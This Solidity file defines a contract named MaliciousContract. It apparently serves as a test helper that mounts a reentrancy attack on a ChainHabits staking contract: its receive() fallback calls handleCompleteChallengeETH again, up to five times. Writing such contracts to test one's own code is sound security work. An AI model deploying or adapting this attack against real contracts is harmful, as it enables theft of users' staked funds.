// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IChainHabits {
    function handleCompleteChallengeETH(
        uint256 _challengeID,
        uint256 _stakeForfeited,
        address _userAddress,
        address _erc20Address
    ) external;
}

contract MaliciousContract {
    IChainHabits public chainHabits;
    uint256 public attackCount;

    constructor(address _chainHabitsAddress) {
        chainHabits = IChainHabits(_chainHabitsAddress);
    }

    function attackChainHabits(uint256 _challengeID, uint256 _stakeForfeited) external {
        chainHabits.handleCompleteChallengeETH(_challengeID, _stakeForfeited, msg.sender, address(0));
    }

    receive() external payable {
        if (attackCount < 5) {
            attackCount++;
            chainHabits.handleCompleteChallengeETH(1, 1 ether, msg.sender, address(0));
        }
    }
}